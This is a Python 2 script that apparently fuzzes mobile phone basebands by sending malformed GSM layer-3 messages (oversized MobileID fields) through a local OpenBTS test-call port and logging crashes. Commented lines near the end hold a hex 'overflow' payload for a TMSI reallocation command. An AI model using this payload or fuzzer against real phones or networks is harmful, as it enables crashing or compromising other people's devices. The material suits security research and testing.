#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
import time
import binascii
import os
from libmich.formats import *
import gsm_um
from adb import ADB

# Default OpenBTS port
TESTCALL_PORT = 28670

# Send a restart to OpenBTS to establish a new channel
def establishNewChannel():
   restart = "RESTART";
   tcsock.sendto(restart, ('127.0.0.1', TESTCALL_PORT));
   # Log when the channel restars
   with open("log.txt", "a") as myfile:
   	myfile.write("\n\nCHANNEL RESTART \n \n");
   return

def adbConnection():
	adb = ADB();
	return adb

def saveRadioLog(adb,title):
	adb.logcatRadio(title);
	adb.logcatRadioClear();
	return

def clearRadioLog(adb):
	adb.logcatRadioClear();
	return

# A function to fuzz fields with variable length
# First picked a few interesting fields and searched
# for functions that are using this field.
# Returns a packet of the given function with a
# Field of the given length.
def fuzzingLengthFields(field, function, length):

	######## 1 MobileID() ########
	# 1 imsiDetachIndication !!
	# 2 locationUpdatingRequest !!
	# 3 tmsiReallocationCommand !!
	# 4 configurationChangeAcknowledge
	# 5 notificationResponse
	# 6 pagingRequestType1
	# 7 pagingRequestType2
	# 8 pagingResponse
	# 9 talkerIndication
	# 10 cmReestablishmentRequest
	# 11 cmServiceRequest
	# 12 identityResponse
	# 13 ptmsiReallocationCommand
	p = '\x05\x18\x01';
	if(field == 1):
		if(function == 1):
			p = gsm_um.imsiDetachIndication();
			p = MobileIDLength(p, length);
			return p
		elif(function == 2):
			p = gsm_um.locationUpdatingRequest();
			return p
		elif(function == 3):
			p = gsm_um.tmsiReallocationCommand();
			p = fakeMobileID(p);
			p = correctLocalAreaID(p)
			return p
		# For testing, works fine
		elif(function == 4):
			p = gsm_um.identityRequestMM();
			return p
		elif(function == 5):
			p = gsm_um.setupMobileOriginated();
			return p
		elif(function == 6):
			p = gsm_um.connectAcknowledge();
			return p;
	######## 2 NetworkName() ########
	#elif(field == 2):
		# 1 mmInformation
		# 2 gmmInformation
	######## 3 ChannelDescription() ########
	#elif(field == 3):
		# 1 systemInformationType1
		# 2 partialRelease
		# 3 immediateAssignmentExtended
		# 4 immediateAssignment
		# 5 frequencyRedefinition
		# 6 additionalAssignment

	######## 4 UserUser() ########
	#elif(field == 4):
		# 1 alertingNetToMs
		# 2 connectNetToMs !!
		# 3 disconnectNetToMs
		# 4 progress
		# 5 releaseNetToMs !!
		# 6 userInformation !!
	else:
		return '\x05\x18\x01'
	
	return p

def mobileFillID(packet, start, length):
	# 00666666
	# 04666666
	for i in range (start,length):
		if((i + 2) % 4 == 0):
			exec "packet.idDigit%s_1=3" % (i)
			exec "packet.idDigit%s=3" % (i)
		else:
			exec "packet.idDigit%s_1=7" % (i)
			exec "packet.idDigit%s=7" % (i)

	return packet

def correctMobileID(p):
	#5220670380
	p.lengthMI=8;
	p.idDigit1=2;
	p.oddEven=1; p.typeOfId=1; 
	p.idDigit2_1=4; p.idDigit2=0; 
	p.idDigit3_1=4; p.idDigit3=0;
	p.idDigit4_1=2; p.idDigit4=5; 
	p.idDigit5_1=0; p.idDigit5=2;
	p.idDigit6_1=7; p.idDigit6=6;
	p.idDigit7_1=3; p.idDigit7=0;
	p.idDigit8_1=0; p.idDigit8=8;
	#p.idDigit9_1=2; p.idDigit9=2;
	return p

def fakeMobileID(p):
	p.lengthMI=8; 
	p.idDigit1=2;

	p.oddEven=1; p.typeOfId=2; 

	# digits start with length of packet p
	p = mobileFillID(p, 2, 67);

	return p

def correctLocalAreaID(a):
	a.mccDigit1=0x1; 
	a.mccDigit2=0x0; 
	a.mccDigit3=0x0; 

	a.mncDigit1=0x0;
	a.mncDigit2=0x1; 
	a.mncDigit3=0x0;

	a.lac1=0x03; a.lac2=0xe9;
	return a

# Adb connection with the mobile device
adb = adbConnection();

# Fuzzing loop
for x in range (0,1):

	# Fuzzing counter
	print "Fuzzing: ", x;

	# Fields: {MobileID = 1, NetworkName = 2, ChannelDescription = 3, UserUser = 4}
	# Function list above at fuzzingLengthFields()
	# Length is variable, determined by x
	packet = fuzzingLengthFields(1, 5, x);
	if(x == 1):
		packet = fuzzingLengthFields(1, 6, x);

	# Make the packet readable
	printable = str(packet).encode("hex");
	print printable;

	# Decode printable hex to make it usable for L3Mobile.
	# Adding the \x for the bytes.
	l3msg = printable.decode('hex');
	l3msg_input = repr(L3Mobile.parse_L3(l3msg));

	print l3msg_input;
	#Creating a socket
	tcsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	tcsock.settimeout(6)
	try:
		# Send message and wait for a reply
		tcsock.sendto(l3msg, ('127.0.0.1', TESTCALL_PORT))
		reply = tcsock.recv(1024)

		# Libmich tries to parse the received packet
		parsed_reply = repr(L3Mobile.parse_L3(reply));

		# Can the reply be parsed by Libmich?
		if "ERROR" not in parsed_reply:
			print "reply received: ", parsed_reply;
		# Create a new channel if a incorrect package has been send by the mobile device.
		else:
			establishNewChannel();
			# Give OpenBTS time to setup a new channel
			time.sleep(6);
		# Log the input and output to a seperate file.
		with open("log.txt", "a") as myfile:
			myfile.write("INPUT " + str(x) + "\n" + l3msg_input + "\nOUTPUT " + str(x) + "\n" + parsed_reply + "\n\n");
	except socket.timeout:
		print "no reply received. potential crash?"
		# Create a new channel if a incorrect package has been send by the mobile device.
		establishNewChannel();
		# Give OpenBTS time to setup a new channel
		time.sleep(6);

# Save the radio log from mobile device
#saveRadioLog(adb, "" + str(x) +"x_" + str(time.strftime("%Y%m%d-%H%M%S")) + "");
#clearRadioLog(adb);

#############################################################################
############################## Trying stuff #################################
#############################################################################
# Identityrequest + random string length test
# randomString = stringOfLength(x);
# print "Random string:", randomString;
# l3msg = '\x05\x18\x01' + randomString;

# def tmsiLength(length):
#    restart = "restartChannel";
#    tcsock.sendto(restart, ('127.0.0.1', TESTCALL_PORT))
#    return

################################ OLD OVERFLOW ################################
# len = 19
# lai = 42
# hexstr = "051a00f110"
# hexstr += "%02x%02x%02xfc" % (lai>>8, lai&255, (4*len+1))
# hexstr += ''.join('%02x666666' % (4*i) for i in range(len))
# r = binascii.unhexlify(hexstr)

# printable2 = str(r).encode("hex");
# print printable2;
# print 42>>8;
 
 # Compare
 #051a010010
 #03e90229
 #4040250276300800

# Original overflow IOS handbook
# 051a00f110
# 002a4dfc
# 00666666
# 04666666
# 08666666
# 0c666666
# 10666666
# 14666666
# 18666666
# 1c666666
# 20666666
# 24666666
# 28666666
# 2c666666
# 30666666
# 34666666
# 38666666
# 3c666666
# 40666666
# 44666666
# 48666666

#hexstr = "06198e480100000000000000000000400000f800002b"

#l3msg = x; #binascii.unhexlify(x)
#l3msg = '\x03\x05\x04\x06`\x04\x02\x00\x05\x81^\x08\x81\x00\x12cy65\x16';
#l3msg = '\x05\x08\x11\x00\xf2 \x03\xe83\x05\xf4T\x01\x98\xcb';

# l3msg = str(gsm_um.locationUpdatingRequest());
# #l3msg = str(gsm_um.locationUpdatingReject());
# #l3msg = str(gsm_um.locationUpdatingRequest());
# p = gsm_um.tmsiReallocationCommand();

# #204045220670380
# p.oddEven=1; p.typeOfId=4; 
# p.idDigit2_1=2; p.idDigit2=2; 
# p.idDigit3_1=2; p.idDigit3=0 ;
# p.idDigit4_1=2 ; p.idDigit4=4 ; 
# p.idDigit5_1=2 ; p.idDigit5=0;
# p.idDigit6_1=2; p.idDigit6=4;
# p.idDigit7_1=2; p.idDigit7=5;
# p.idDigit8_1=2; p.idDigit8=2;
# p.idDigit9_1=2; p.idDigit9=2;
# p.idDigit10_1=2; p.idDigit10=0;
# p.idDigit11_1=2; p.idDigit11=6;
# p.idDigit12_1=2; p.idDigit12=7;
# p.idDigit13_1=2; p.idDigit13=0;
# p.idDigit14_1=2; p.idDigit14=3;
# p.idDigit15_1=2; p.idDigit15=8;
# p.idDigit16_1=2; p.idDigit16=0;
# p.idDigit17_1=2; p.idDigit17=0xe;
# p.idDigit18_1=2; p.idDigit18=0xe;
# p.idDigit19_1=2; p.idDigit19=0xe;
# p.idDigit20_1=2; p.idDigit20=0xe;
# p.idDigit21_1=2; p.idDigit21=0xe;
# p.idDigit22_1=2; p.idDigit22=0xe;
# p.idDigit23_1=2; p.idDigit23=0xe;
# p.idDigit24_1=2; p.idDigit24=0xe;
# p.idDigit25_1=2; p.idDigit25=0xe;
# p.idDigit26_1=2; p.idDigit26=0xe;
# p.idDigit27_1=2; p.idDigit27=0xe;
# p.idDigit28_1=2; p.idDigit28=0xe;
# p.idDigit29_1=2; p.idDigit29=0xe;
# p.idDigit30_1=2; p.idDigit30=0xe;
# p.idDigit31_1=2; p.idDigit31=0xe;
# p.idDigit32_1=2; p.idDigit32=0xe;
# p.idDigit33_1=2; p.idDigit33=0xe;
# p.idDigit34_1=2; p.idDigit34=0xe;
# p.idDigit35_1=2; p.idDigit35=0xe;
# p.idDigit36_1=2; p.idDigit36=0xe;
# p.idDigit37_1=2; p.idDigit37=0xe;
# p.idDigit38_1=2; p.idDigit38=0xe;
# p.idDigit39_1=2; p.idDigit39=0xe;
# p.idDigit40_1=2; p.idDigit40=0xe;
# p.idDigit41_1=2; p.idDigit41=0xe;
# p.idDigit42_1=2; p.idDigit42=0xe;
# p.idDigit43_1=2; p.idDigit43=0xe;
# p.idDigit44_1=2; p.idDigit44=0xe;
# p.idDigit45_1=2; p.idDigit45=0xe;
# p.idDigit46_1=2; p.idDigit46=0xe;
# p.idDigit47_1=2; p.idDigit47=0xe;
# p.idDigit48_1=2; p.idDigit48=0xe;
# p.idDigit49_1=2; p.idDigit49=0xe;

# p.mccDigit2=0x4; p.mccDigit1=2; p.mccDigit3=6; p.mncDigit1=0;
# p.mncDigit3=0xf; p.mncDigit2=0x3; p.lac1=0x0; p.lac2=0x4;
# p.idDigit1=0xf; p.oddEven=0;
#gsm_um.hexdump(p);

# a = gsm_um.tmsiReallocationCommand();
# a.oddEven=1
# a.typeOfId=4
# a.idDigit2_1=2; a.idDigit2=0xe; a.idDigit3_1=4; a.idDigit3=8 ;
# a.idDigit4_1=0xe ; a.idDigit4=5 ; a.idDigit5_1=0xe ; a.idDigit5=0
# a.mccDigit2=0x4; a.mccDigit1=2; a.mccDigit3=6; a.mncDigit1=0
# a.mncDigit3=0xf; a.mncDigit2=0x3; a.lac1=0x0; a.lac2=0x4
# a.idDigit1=0xf; a.oddEven=0
#l3msg = str(gsm_um.tmsiReallocationCommand());
#x = gsm_um.alertingNetToMs();
# l3msg = str(p);
# l3msg = str(a);
# l3msg = str(r);
# gsm_um.hexdump(a);
# Identity request (Works!)
#l3msg = '\x05\x18\x01';